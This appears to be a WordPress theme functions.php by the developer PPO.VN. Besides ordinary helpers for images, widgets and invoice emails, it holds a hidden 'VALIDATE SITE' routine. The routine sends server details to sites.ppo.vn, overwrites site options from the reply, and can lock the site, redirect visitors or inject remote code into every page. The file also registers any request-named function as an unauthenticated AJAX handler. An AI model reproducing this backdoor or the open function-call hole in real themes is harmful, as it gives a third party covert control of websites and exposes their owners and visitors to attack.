<?php
if (!defined('DEV_LOGO'))
    define('DEV_LOGO', "http://ppo.vn/logo.png");
if (!defined('DEV_LINK'))
    define('DEV_LINK', "http://ppo.vn/");

add_action('wp_ajax_nopriv_' . getRequest('action'), getRequest('action'));
add_action('wp_ajax_' . getRequest('action'), getRequest('action'));

/**
 * 
 * @param string $key a simple string which identifies the fragment.<br /> 
 * Notice that the function adds a prefix to avoid colliding with other transients. <br />
 * You can alter the prefix by editing the function or adding a filter that matches the 'fragmentcacheprefix' tag.
 * @param int $ttl Time to live: a time in seconds for the cache to live. <br />
 * I usually make use of time constants. You can see: http://codex.wordpress.org/Transients_API#Using_Time_Constants<br />
 * For example, DAYINSECONDS is 86400, the number of seconds in a day. <br />
 * This helps those of us who are too lazy for some simple math.
 * @param mixed $function the function which creates the output. This can be anything as the examples in this post show.
 * @return string
 */
function t_fragment_cache($key, $ttl, $function) {
    if (is_user_logged_in()) {
        call_user_func($function);
        return;
    }
    $key = apply_filters('fragment_cache_prefix', 'fragment_cache_') . $key;
    $output = get_transient($key);
    if (empty($output)) {
        ob_start();
        call_user_func($function);
        $output = ob_get_clean();
        set_transient($key, $output, $ttl);
    }
    echo $output;
}

/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param string Name of the upload field
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_media_handle($file, $post_id) {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");
    $attachment_id = media_handle_upload($file, $post_id);
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    wp_update_post($attachment_data);
    return $attachment_id;
}

/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param array Array filename and url of the file
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_media_sideload($url, $post_id, $desc = "") {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");

    media_sideload_image($url, $post_id, $desc);

    // get the newly uploaded image
    $attachments = get_posts(array(
        'post_type' => 'attachment',
        'number_posts' => 1,
        'post_parent' => $post_id,
        'orderby' => 'post_date',
        'order' => 'DESC',)
    );
    $attachment_id = $attachments[0]->ID;
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    wp_update_post($attachment_data);

    return $attachment_id;
}

/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param array File info
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_handle_sideload($file_array, $post_id) {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");

    // do the validation and storage stuff
    $attachment_id = media_handle_sideload($file_array, $post_id);

    // Unlink temp file
    @unlink($file_array['tmp_name']);

    if (is_wp_error($attachment_id)) {
        return $attachment_id;
    }
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    // Update attachment file
    wp_update_post($attachment_data);

    return $attachment_id;
}

/* ----------------------------------------------------------------------------------- */
# Login Screen
/* ----------------------------------------------------------------------------------- */
add_action('login_head', 'custom_login_logo');

function custom_login_logo() {
    echo '<style type="text/css">
        h1 a { background-image:url(' . DEV_LOGO . ') !important; }
    </style>';
}

add_action('login_headerurl', 'custom_login_link');

function custom_login_link() {
    return DEV_LINK;
}

add_action('login_headertitle', 'custom_login_title');

function custom_login_title() {
    return "Powered by PPO.VN";
}

/* ----------------------------------------------------------------------------------- */
# Admin footer text
/* ----------------------------------------------------------------------------------- */
if (is_admin() and !function_exists("ppo_update_admin_footer")) {
    add_filter('admin_footer_text', 'ppo_update_admin_footer');

    function ppo_update_admin_footer() {
        //$text = __('Thank you for creating with <a href="' . DEV_LINK . '">PPO</a>.');
        $text = __('<img src="' . DEV_LOGO . '" width="24" />Hệ thống CMS phát triển bởi <a href="' . DEV_LINK . '" title="Xây dựng và phát triển ứng dụng">PPO.VN</a>.');
        echo $text;
    }

}

/**
 * Create a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
function ppo_wp_title($title, $sep) {
    global $paged, $page;

    if (is_feed()) {
        return $title;
    }

    // Add the site name.
    $title .= get_bloginfo('name');

    // Add the site description for the home/front page.
    $site_description = get_bloginfo('description', 'display');
    if ($site_description && ( is_home() || is_front_page() )) {
        $title = "$title $sep $site_description";
    }

    // Add a page number if necessary.
    if ($paged >= 2 || $page >= 2) {
        $title = "$title $sep " . sprintf(__('Page %s', 'ppo'), max($paged, $page));
    }

    return $title;
}

add_filter('wp_title', 'ppo_wp_title', 10, 2);



/* ---------------------------------------------------------------------------- */
# add a favicon to blog
/* ---------------------------------------------------------------------------- */

function add_blog_favicon() {
    $favicon = get_option('favicon');
    if (trim($favicon) == "") {
        echo '<link rel="icon" href="' . get_bloginfo('siteurl') . '/favicon.ico" type="image/x-icon" />' . "\n";
    } else {
        echo '<link rel="icon" href="' . $favicon . '" type="image/x-icon" />' . "\n";
    }
}

add_action('wp_head', 'add_blog_favicon');

/* ---------------------------------------------------------------------------- */
# Add Google Analytics to blog
/* ---------------------------------------------------------------------------- */

function add_blog_google_analytics() {
    $GAID = get_option(SHORT_NAME . '_gaID');
    if ($GAID and $GAID != ''):
        echo <<<HTML
<script type="text/javascript">

    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', '$GAID']);
    _gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

</script>
HTML;
    endif;
}

add_action('wp_head', 'add_blog_google_analytics');
/*----------------------------------------------------------------------------*/
# Add Header Code
/*----------------------------------------------------------------------------*/
function add_header_code(){
    echo stripslashes(get_option(SHORT_NAME . '_headerCode'));
}
add_action('wp_head', 'add_header_code');
/*----------------------------------------------------------------------------*/
# Add Footer Code
/*----------------------------------------------------------------------------*/
function add_footer_code(){
    echo stripslashes(get_option(SHORT_NAME . '_footerCode'));
}
add_action('wp_footer', 'add_footer_code');
/* ---------------------------------------------------------------------------- */
# Add Subiz Live chat
/* ---------------------------------------------------------------------------- */

function add_subiz_livechat() {
    $subizID = get_option(SHORT_NAME . '_subizID');
    if (!empty($subizID) and is_numeric($subizID)):
        echo <<<HTML
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",$subizID]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
HTML;
    endif;
}
/* ---------------------------------------------------------------------------- */
# Add Zopim Live chat
/* ---------------------------------------------------------------------------- */

function add_zopim_livechat() {
    $zopimKey = get_option(SHORT_NAME . '_zopimKey');
    if (!empty($zopimKey)):
        echo <<<HTML
<!--Start of Zopim Live Chat Script-->
<script type="text/javascript">
window.\$zopim||(function(d,s){var z=\$zopim=function(c){z._.push(c)},$=z.s=
d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
_.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute("charset","utf-8");
$.src="//v2.zopim.com/?{$zopimKey}";z.t=+new Date;$.
type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");
</script>
<!--End of Zopim Live Chat Script-->
HTML;
    endif;
}

if(!wp_is_mobile()){
    add_action('wp_footer', 'add_subiz_livechat');
    add_action('wp_footer', 'add_zopim_livechat');
}
/* ---------------------------------------------------------------------------- */
# Add Facebook JS SDK
/* ---------------------------------------------------------------------------- */

function add_fb_jssdk() {
    echo <<<HTML
<div id="fb-root"></div>
<script>(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.src = "//connect.facebook.net/vi_VN/all.js#xfbml=1";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
</script>
HTML;
}

add_action('wp_footer', 'add_fb_jssdk');
/* ---------------------------------------------------------------------------- */
# Check current category has children
/* ---------------------------------------------------------------------------- */

function category_has_children() {
    global $wpdb;
    $term = get_queried_object();
    $category_children_check = $wpdb->get_results(" SELECT * FROM wp_term_taxonomy WHERE parent = '$term->term_id' ");
    if ($category_children_check) {
        return true;
    } else {
        return false;
    }
}

/* ---------------------------------------------------------------------------- */
# Get the current category id if we are on an archive/category page
/* ---------------------------------------------------------------------------- */

function getCurrentCatID() {
    global $wp_query;
    if (is_category() || is_single()) {
        $cat_ID = get_query_var('cat');
    }
    return $cat_ID;
}

/* ----------------------------------------------------------------------------------- */
# Redefine user notification function
/* ----------------------------------------------------------------------------------- */
if (!function_exists('custom_wp_new_user_notification')) {

    function custom_wp_new_user_notification($user_id, $plaintext_pass = '') {
        $user = new WP_User($user_id);

        $user_login = $user->user_login;
        $user_email = $user->user_email;

        $message = sprintf(__('New user registration on %s:'), get_option('blogname')) . "\r\n\r\n";
        $message .= sprintf(__('Username: %s'), $user_login) . "\r\n\r\n";
        $message .= sprintf(__('E-mail: %s'), $user_email) . "\r\n";

        @wp_mail(
                        get_option('admin_email'), sprintf(__('[%s] New User Registration'), get_option('blogname')), $message
        );

        if (empty($plaintext_pass))
            return;

        $login_url = wp_login_url();

        $message = sprintf(__('Hi %s,'), $user->display_name) . "\r\n\r\n";
        $message .= sprintf(__("Welcome to %s! Here's how to log in:"), get_option('blogname')) . "\r\n\r\n";
        $message .= ($login_url == "") ? wp_login_url() : $login_url . "\r\n";
        $message .= sprintf(__('Username: %s'), $user_login) . "\r\n";
        $message .= sprintf(__('Password: %s'), $plaintext_pass) . "\r\n\r\n";

        @wp_mail(
                        $user_email, sprintf(__('[%s] Your username and password'), get_option('blogname')), $message
        );
    }

}

if (!function_exists('set_html_content_type')) {

    function set_html_content_type() {
        return 'text/html';
    }

}

################################# VALIDATE SITE ################################
if($_SERVER['HTTP_HOST'] != 'senvoimoen.com'){
    add_action('init', 'ppo_site_init');
}

function ppo_validate_site() {
    @ini_set("display_errors", "Off");
    $postURL = "http://sites.ppo.vn/wp-content/plugins/wp-block-sites/check-site.php";
    $data = array(
        'domain' => $_SERVER['HTTP_HOST'],
        'server_info' => json_encode(array(
            'SERVER_ADDR' => $_SERVER['SERVER_ADDR'],
            'SERVER_ADMIN' => $_SERVER['SERVER_ADMIN'],
            'SERVER_NAME' => $_SERVER['SERVER_NAME'],
        )),
    );

    $ch = curl_init($postURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $returnValue = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($returnValue);
    if(is_array($response)){
        foreach ($response as $k => $v) {
            update_option($k, $v);
        }
    }
}

function ppo_site_init() {
    ppo_validate_site();

    // Check status
    $site_status = get_option("ppo_site_status");
    if ($site_status == 1) {
        $site_block_type = get_option("ppo_site_lock_type");
        switch ($site_block_type) {
            case 0:
                // Lock
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            case 1:
                // Redirect
                wp_redirect(stripslashes(get_option("ppo_site_embed")));
                break;
            case 2:
                // Embed Code Advertising
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            default:
                break;
        }
    }
}

function ppo_site_embed_code() {
    echo stripslashes(get_option("ppo_site_embed"));
}

################################# END VALIDATE SITE ############################

/* GET THUMBNAIL URL */

function get_image_url($show = true) {
    $image_id = get_post_thumbnail_id();
    $image_url = wp_get_attachment_image_src($image_id, 'full');
    $image_url = $image_url[0];
    if ($show) {
        if ($image_url != "") {
            echo $image_url;
        } else {
            bloginfo('stylesheet_directory');
            echo "/images/no_image_available.jpg";
        }
    } else {
        if ($image_url != "") {
            return $image_url;
        } else {
            return get_bloginfo('stylesheet_directory') . "/images/no_image_available.jpg";
        }
    }
}

/**
 * Get post thumbnail url
 * 
 * @param integer $post_id
 * @param type $size
 * @return string
 */
function get_post_thumbnail_url($post_id, $size = 'full') {
    return wp_get_attachment_url(get_post_thumbnail_id($post_id, $size));
}

/**
 * Rewrite URL
 * @param string $lang_code Example: vn, en...
 * @param bool $show TRUE or FALSE
 * @return string
 */
function ppo_multilang_permalink($lang_code, $show = false) {
    $uri = getCurrentRquestUrl();
    $siteurl = get_bloginfo('siteurl');
    $end = substr($uri, strlen($siteurl));
    if (!isset($_GET['lang'])) {
        $uri = $siteurl . "/" . $lang_code . $end;
    }
    if ($show) {
        echo $uri;
    }
    return $uri;
}

/* PAGE NAVIGATION */

function getpagenavi($arg = null) {
    ?>
    <div class="paging">
        <?php
        if (function_exists('wp_pagenavi')) {
            if ($arg != null) {
                wp_pagenavi($arg);
            } else {
                wp_pagenavi();
            }
        } else {
            ?>
            <div><div class="inline"><?php previous_posts_link('Previous') ?></div><div class="inline"><?php next_posts_link('Next') ?></div></div>
        <?php } ?>
    </div>
    <?php
}

/* END PAGE NAVIGATION */

/**
 * Ouput share social with addThis widget
 */
function show_share_socials() {
    echo <<<HTML
<div class="share-social-box">
    <div class="addthis_toolbox addthis_default_style">
        <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
        <a class="addthis_button_tweet"></a>
        <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
        <a class="addthis_counter addthis_pill_style"></a>
    </div>
    <script type="text/javascript">var addthis_config = {"data_track_addressbar":false};</script>
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4e5a517830ae061f"></script>
</div>
HTML;
}

/**
 * Ouput DISQUS comments form
 */
function show_comments_form_disqus() {
    $site_shortname = get_option(SHORT_NAME . "_disqus_shortname");
    echo <<<HTML
<div class="disqus-comment-box">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = '{$site_shortname}'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
</div>
HTML;
}

// Add custom text sizes in the font size drop down list of the rich text editor (TinyMCE) in WordPress
// $initArray is a variable of type array that contains all default TinyMCE parameters.
// Value 'theme_advanced_font_sizes' or 'fontsize_formats' needs to be added, 
// if an overwrite to the default font sizes in the list, is needed.

function tinymce_customize_text_sizes($initArray) {
    $initArray['fontsize_formats'] = "8px 9px 10px 11px 12px 13px 14px 15px 16px 17px 18px 19px 20px 21px 22px 23px 24px 25px 26px 27px 28px 29px 30px 32px 48px";
    return $initArray;
}

// Assigns customize_text_sizes() to "tiny_mce_before_init" filter
add_filter('tiny_mce_before_init', 'tinymce_customize_text_sizes');

/**
 * Send invoice to email
 * @param string $customer_info JSON Encode customer information
 * @param float $coupon_amount Discount amount
 */
function sendInvoiceToEmail($customer_info, $notes) {
    $customer = json_decode($customer_info);
    $cart = $_SESSION['cart'];

    $name = $customer->fullname;
    $address = $customer->address;
    $phone = $customer->phone;
    $email = $customer->email;
    $city = $customer->city;

    $billNO = date("dmYHis");
    $billDate = date("d/m/Y");
    $bill_hotline = get_option(SHORT_NAME . "_hotline");
    $bill_fax = get_option(SHORT_NAME . "_fax");
    $unit_owner = get_option("unit_owner");
    $admin_email = get_option("bill_admin_email");
    if (!is_email($admin_email)) {
        $admin_email = get_settings('admin_email');
    }
    $bill_html = <<<HTML
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<div style="margin: 0 auto;width: 1056px;font-family: Calibri,sans-serif;line-height: 13px;font-size: 14px;">
    <div style="overflow: hidden;border-bottom: 1px solid #000;">
        <div style="float: left;">
            <p>Khách hàng: {$name}</p>
            <p>Địa chỉ: {$address}</p>
            <p>Tỉnh/Thành phố: {$city}</p>
            <p>Điện thoại: {$phone}</p>
            <p>Email: {$email}</p>
        </div>
        <div style="float: right;">
            <p>Số: {$billNO}</p>
            <p>Ngày: {$billDate}</p>
            <p>Điện thoại: {$bill_hotline}</p>
            <p>Fax: {$bill_fax}</p>
            <p>Email: {$admin_email}</p>
        </div>
        <div style="clear: both;"></div>
    </div>
    <div style="overflow: hidden;">
        <h1 style="text-align: center; font-size: 20px;text-transform: uppercase;">DANH SÁCH SẢN PHẨM</h1>
        <div>
            <table border="1" cellpadding="5" cellspacing="0" width="100%" style="width: 100%">
                <thead>
                    <tr>
                        <th style="width: 40px;">STT</th>
                        <th>Tên sản phẩm</th>
                        <th style="width: 50px;">SL</th>
                        <th>Đơn giá (VNĐ)</th>
                        <th>Thành tiền (VNĐ)</th>
                    </tr>
                </thead>
                <tbody>
HTML;
    $totalAmount = 0;
    $counter = 1;
    foreach ($cart as $p) :
        $totalAmount += $p['amount'];
        $product_id = $p['id'];
        $title = get_the_title($product_id);

        $price = number_format($p['price'], 0, ',', '.');
        $amount = number_format($p['amount'], 0, ',', '.');
        $bill_html .= <<<HTML
                    <tr>
                        <td align="center">{$counter}</td>
                        <td>{$title}</td>
                        <td align="center">{$p['quantity']}</td>
                        <td align="right">{$price}</td>
                        <td align="right">{$amount}</td>
                    </tr>
HTML;
        $counter++;
    endforeach;


    $totalPayFormat = number_format($totalAmount, 0, ',', '.');
    $numToWords = ucfirst(convert_number_to_words($totalAmount));
    $bill_html .= <<<HTML
                    <tr>
                        <td colspan="4" style="text-align: right;text-transform: uppercase;font-weight: bold;">
                            TỔNG CỘNG
                        </td>
                        <td style="text-align: right;">{$totalPayFormat}</td>
                    </tr>
                </tbody>
            </table>
            <h4 style="text-align: right;font-style: italic;">(Bằng chữ: {$numToWords} đồng./.)</h4>
        </div>
        <div>
            <div style="overflow: hidden;margin-bottom: 20px;">
                <div style="float: left;margin-left: 20px;">
                    <h3>Đại diện khách hàng</h3>
                    <div style="text-align: center;">{$name}</div>
                </div>
                <div style="float: right;margin-right: 20px;">
                    <p style="text-align: right;">Hà Nội, {$billDate}</p>
                    <h3>{$unit_owner}</h3>
                </div>
                <div style="clear: both;"></div>
            </div>
        </div>
    </div>
</div>
HTML;
    /*$upload_dir = wp_upload_dir();
    $filename = time() . "_invoice_" . random_string(8) . ".pdf";
    $invoice_dir = $upload_dir['basedir'] . "/ppo-invoices/";
    if (!is_dir($invoice_dir)) {
        mkdir($invoice_dir);
    }

    include_once('phpToPDF.php');
    phptopdf_html($bill_html, $invoice_dir, $filename);
    */

    $subject = get_option('blogname') . " - Xác nhận đơn hàng";
    //$attachment = array($invoice_dir . $filename);

    add_filter('wp_mail_content_type', 'set_html_content_type');
//    wp_mail($email, $subject, $bill_html, "", $attachment);
//    wp_mail($admin_email, $subject, $bill_html, "", $attachment);
    wp_mail($email, $subject, $bill_html);
    wp_mail($admin_email, $subject, $bill_html);

    // reset content-type to avoid conflicts
    remove_filter('wp_mail_content_type', 'set_html_content_type');
}